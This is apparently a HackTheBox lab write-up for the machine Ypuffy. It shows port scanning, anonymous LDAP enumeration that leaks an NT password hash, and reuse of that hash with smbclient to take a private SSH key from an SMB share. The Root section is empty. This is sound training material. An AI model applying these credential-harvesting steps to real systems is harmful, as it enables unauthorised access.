---
title: "HTB Write-up: Ypuffy"
date: 2019-01-05
category: [HackTheBox]
tags: [HackTheBox, HTB, ]
header:
    teaser: "/assets/images/htb/ypuffy/ypuffy.png"
---

![ypuffy_info.png](/assets/images/htb/ypuffy/ypuffy_info.png)

*Note: I completed this challenge on January 5th, 2019, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin enumeration, the `masscan` tool was used to scan the target system for open ports. 

```
root@kali:~/workspace/hackthebox/Ypuffy# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.107

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-26 23:05:58 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 445/tcp on 10.10.10.107                                   
Discovered open port 22/tcp on 10.10.10.107                                    
Discovered open port 389/tcp on 10.10.10.107                                   
Discovered open port 80/tcp on 10.10.10.107                                    
Discovered open port 139/tcp on 10.10.10.107
   
```

This scan revealed that a variety of ports were open and listening for connections. TCP ports 445 and 139 are used with SMB, port 389 is used for LDAP, port 80 is used as a HTTP port, and port 22 is SSH. Taking these open ports, the `nmap` tool was then used to further enumerate the open ports.

```
root@kali:~/workspace/hackthebox/Ypuffy# nmap -p 445,22,389,80,139 -sC -sV -oA scans/discovered-tcp 10.10.10.107
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 16:11 MST
Nmap scan report for 10.10.10.107
Host is up (0.066s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
Service Info: Host: YPUFFY

Host script results:
|_clock-skew: mean: 1h40m22s, deviation: 2h53m12s, median: 22s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6)
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY\x00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System time: 2019-12-26T18:12:10-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-12-26T23:12:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.04 seconds
```

The `nmap` output regarding port 80 suggests that this is a OpenBSD system. The scan has also reported that anonymous binds are allowed on the LDAP server on port 389. LDAP stands for "Lightweight Directory Access Protocol" and is often used for user validation validation to particular resources, amongst other things. The LDAP service running port 389 was enumerated further using the `nmap` scripting engine.

```
root@kali:~/workspace/hackthebox/Ypuffy# nmap --script /usr/share/nmap/scripts/ldap-search.nse 10.10.10.107
```

Querying the LDAP service reveals some information about the target system, including some configured users.

```
...
dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb                                    
    uid: bob8791                                                                  
    cn: Bob                                                                       
    objectClass: account                                                          
    objectClass: posixAccount                                                     
    objectClass: top                                                              
    userPassword: {BSDAUTH}bob8791                                                
    uidNumber: 5001                                                               
    gidNumber: 5001                                                               
    gecos: Bob                                                                    
    homeDirectory: /home/bob8791                                                  
    loginShell: /bin/ksh    
dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb                                                                                                                            
    uid: alice1978                                                                                                                                                          
    cn: Alice                                                                                                                                                               
    objectClass: account
    objectClass: posixAccount
    objectClass: top
    objectClass: sambaSamAccount
    userPassword: {BSDAUTH}alice1978
    uidNumber: 5000
    gidNumber: 5000
    gecos: Alice
    homeDirectory: /home/alice1978
    loginShell: /bin/ksh
    sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
    displayName: Alice
    sambaAcctFlags: [U          ]
    sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
    sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
    sambaPwdLastSet: 1532916644
...
```

The `userPassword` fields look juicy, but some [research](http://puffysecurity.com/wiki/ypldap.html) on the setup of an OpenBSD LDAP server and YP domains via `ypldap` explains that the presence of  `userPassword` means that the configured user will be authenitacted by `{BSDAUTH}` and that passwords are checked against a Blowfish hash stored in LDAP.

The entry for the `alice1978` user additionally contains a value in the `sambaNTPassword` field. This value is a Samba password that is hashed using the MD4 algorithm. With the help of the `smbclient` tool, the hashed Samba password can be used to authenticate to the SMB service on port 445 as the user `alice1978`.

From `man smbclient`:

```
--pw-nt-hash
    The supplied password is the NT hash.
```

First, the available Samba shares were listed via the command below with `0B186E661BBDBDCF6047784DE8B9FD8B` as the password.

```
root@kali:~/workspace/hackthebox/Ypuffy# smbclient --user=alice1978 --pw-nt-hash -L //10.10.10.107 
Enter WORKGROUP\alice1978's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        alice           Disk      Alice's Windows Directory
        IPC$            IPC       IPC Service (Samba Server)
...
```

Next, the `alice` share was accessed once again using the hashed Samba password for authentication.

```
root@kali:~/workspace/hackthebox/Ypuffy# smbclient --user=alice1978 --pw-nt-hash //10.10.10.107/alice
```

After connecting and listing the files with the `dir` command, the only file present in the `alice` SMB share is `my_private_key.ppk`. The `.ppk` extension suggests that this is a PuTTY private key file, and that the contents within are the `alice` user's private SSH key. The `my_private_key.ppk` file can be copied to the attacking system using the `get` SMB command.

```
smb: \> get my_private_key.ppk 
getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (6.0 KiloBytes/sec) (average 6.0 KiloBytes/sec)
```







## Root


